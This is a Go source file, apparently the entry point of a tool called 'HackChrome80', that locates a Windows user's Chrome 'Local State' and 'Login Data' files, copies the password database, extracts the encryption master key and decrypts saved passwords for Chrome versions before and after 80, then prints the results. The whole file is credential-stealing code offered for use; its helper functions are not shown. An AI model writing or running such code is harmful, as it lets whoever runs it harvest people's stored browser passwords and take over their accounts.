package main

import (
	"HackChrome80/core"
	"HackChrome80/utils"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"os"
)


func main(){
	key_file := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"
	orig_pwd_db := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/default/Login Data"
	pwd_db := "LocalDB"

	utils.CopyFile(orig_pwd_db, pwd_db)

	master_key, err := core.GetMaster(key_file)
	if err != nil{
		fmt.Println(err)
		return
	}

	// chrome > v80
	chrome_v80_res := core.GetPwd(pwd_db, master_key)
	// chrome < v80
	chrome_res := core.GetPwdPre(pwd_db)
	// total
	total_res := utils.Merge(chrome_v80_res, chrome_res)

	err = utils.FormatOutput(total_res, pwd_db)
	if err != nil{
		fmt.Println(err)
		return
	}
}
